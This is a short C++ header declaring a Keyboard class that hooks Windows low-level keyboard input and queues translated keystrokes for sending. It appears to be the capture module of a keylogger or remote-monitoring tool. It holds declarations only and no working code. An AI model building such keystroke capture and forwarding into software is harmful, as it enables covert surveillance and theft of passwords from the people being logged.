#ifndef KEYBOARD_HPP_
#define KEYBOARD_HPP_

#include "AThreadedModule.hpp"
#include <string>
#include <utility>
#include <deque>
#include "Request.hpp"

LRESULT CALLBACK LowLevelKeyboardProcStatic(int, WPARAM, LPARAM);

class Keyboard : public AThreadedModule {

public:
	Keyboard(std::deque<std::pair<Request, std::string>> &sendingQueue);
	Keyboard(const Keyboard &obj);
	Keyboard &operator=(const Keyboard &obj);
	~Keyboard();

	virtual void update();
	virtual void setup();
	LRESULT CALLBACK LowLevelKeyboardProc(int, WPARAM, LPARAM);
	static Keyboard *_Static;
private:
	bool _display;
	std::deque<std::pair<Request, std::string>> &_sendingQueue;
	std::pair<bool, std::string> const manageSpecialKey(int key);
	std::pair<bool, std::string> const manageShityKey(int key, bool isShiftPressed);
	std::pair<bool, std::string> const manageNum(int key);
	std::pair<bool, std::string> const manageAltGr(int key);
	std::string _stringLine;
};

#endif /* KEYBOARD_HPP_ */
